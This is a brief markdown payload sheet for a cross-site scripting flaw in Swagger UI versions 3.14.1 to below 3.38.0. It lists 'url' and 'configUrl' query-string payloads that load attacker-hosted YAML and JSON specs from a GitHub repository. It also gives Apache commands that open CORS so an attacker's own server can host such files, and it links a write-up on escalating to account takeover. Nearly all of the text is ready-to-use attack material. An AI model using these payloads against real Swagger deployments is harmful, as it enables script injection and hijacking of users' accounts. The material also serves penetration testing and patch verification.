# Swagger UI >=3.14.1 < 3.38.0 XSS payload

- Swagger UI version affected: `>=3.14.1 < 3.38.0`

## Payloads

### `url`
`?url=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/xss-domain.yaml`
`?url=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/xss-fetch.yaml`
### `configUrl`

`?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json`

**More info at**: https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/

test.json -> test.yaml
`?configUrl=https://xxx.xxx.xxx/test.json`

### `apache CORS bug（NO bug）`
`a2enmod headers`

`vim /etc/apache2/apache2.conf`

```
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
        Header set Access-Control-Allow-Origin "*"
</Directory>
```

`apachectl -t`

`sudo systemctl restart apache2` or `sudo service apache2 restart`



## From :)

https://github.com/VictorNS69/swagger-ui-xss

https://github.com/seanmarpo/swagger-xss-payloads#swagger-xss-payloads
